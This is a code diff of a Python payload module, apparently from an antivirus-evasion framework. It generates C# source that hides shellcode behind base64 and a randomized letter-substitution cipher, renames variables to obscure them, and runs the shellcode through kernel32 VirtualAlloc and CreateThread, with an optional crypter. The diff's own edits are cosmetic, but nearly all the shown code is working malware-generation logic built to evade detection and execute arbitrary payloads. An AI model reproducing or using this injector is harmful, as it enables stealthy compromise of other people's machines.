@@ -1,6 +1,6 @@
 """
 
-C# inline injector that utilizes base64 encoding and a randomized alphabetic 
+C# inline injector that utilizes base64 encoding and a randomized alphabetic
 letter substitution cipher to obscure the shellcode string in the payload.
 Uses basic variable renaming obfuscation.
 
@@ -15,23 +15,25 @@ from modules.common import encryption
 from modules.common import helpers
 
 class Payload:
-    
+
     def __init__(self):
         # required
         self.language = "cs"
         self.extension = "cs"
         self.rating = "Normal"
         self.description = "C# method that base64/letter substitutes the shellcode to inject"
-        
+
         self.shellcode = shellcode.Shellcode()
-        # options we require user ineraction for- format is {Option : [Value, Description]]}
-        self.required_options = {"compile_to_exe"   : ["Y", "Compile to an executable"],
-                                 "use_arya"         : ["N", "Use the Arya crypter"]}
-        
+        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
+        self.required_options = {
+                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
+                                    "USE_ARYA"       : ["N", "Use the Arya crypter"]
+                                }
+
     def generate(self):
-        
+
         Shellcode = self.shellcode.generate()
-        
+
         # the 'key' is a randomized alpha lookup table [a-zA-Z] used for substitution
         key = ''.join(sorted(list(string.ascii_letters), key=lambda *args: random.random()))
         base64payload = encryption.b64sub(Shellcode,key)
@@ -54,7 +56,7 @@ class Payload:
         dictionaryName = helpers.randomString()
 
 
-        payloadCode = "using System; using System.Net; using System.Text; using System.Linq; using System.Net.Sockets;" 
+        payloadCode = "using System; using System.Net; using System.Text; using System.Linq; using System.Net.Sockets;"
         payloadCode += "using System.Collections.Generic; using System.Runtime.InteropServices;\n"
 
         payloadCode += "namespace %s { class %s { private static string %s(string t, string k) {\n" % (namespaceName, className, decodeFuncName)
@@ -93,8 +95,8 @@ class Payload:
         # payloadCode += "private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n"
         payloadCode += """[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])
 
-        if self.required_options["use_arya"][0].lower() == "y":
+        if self.required_options["USE_ARYA"][0].lower() == "y":
             payloadCode = encryption.arya(payloadCode)
-            
+
         return payloadCode
 
